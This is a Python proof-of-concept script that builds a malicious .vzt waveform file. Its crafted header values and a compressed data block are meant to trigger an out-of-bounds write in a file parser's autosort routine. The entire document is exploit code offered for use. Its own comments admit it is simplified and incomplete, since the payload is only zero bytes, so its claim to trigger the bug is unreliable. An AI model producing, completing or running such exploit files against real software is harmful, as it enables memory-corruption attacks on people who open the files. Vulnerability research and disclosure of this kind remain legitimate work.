#!/usr/bin/env python3

import struct
import zlib
import sys

# Craft a malicious .vzt file that triggers the out-of-bounds write
# This is a simplified proof-of-concept

def create_malicious_vzt(filename):
    with open(filename, 'wb') as f:
        # VZT header
        f.write(b'VZT\x01')  # ID and version
        f.write(b'\x01')     # granule_size
        
        # Set up malicious values
        f.write(struct.pack('>I', 1))  # numfacs
        f.write(struct.pack('>I', 0))  # numfacbytes
        f.write(struct.pack('>I', 10)) # longestname
        f.write(struct.pack('>I', 0))  # zfacnamesize
        f.write(struct.pack('>I', 0))  # zfacname_predec_size
        f.write(struct.pack('>I', 0))  # zfacgeometrysize
        f.write(b'\x01')              # timescale
        
        # Create a malicious block
        f.write(struct.pack('>I', 0x100))  # uncompressed_siz
        f.write(struct.pack('>I', 0x100))  # compressed_siz
        f.write(struct.pack('>Q', 0))      # start
        f.write(struct.pack('>Q', 1))      # end
        
        # Craft malicious compressed data that will trigger the OOB write
        # This would need to be carefully constructed to control the change_dict
        # and force an out-of-bounds write in autosort
        malicious_data = b'\x00' * 0x100
        compressed = zlib.compress(malicious_data)
        f.write(compressed)
        
        # Pad to reach compressed_siz
        f.write(b'\x00' * (0x100 - len(compressed)))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output.vzt>")
        sys.exit(1)
    
    create_malicious_vzt(sys.argv[1])
    print(f"Created malicious VZT file: {sys.argv[1]}")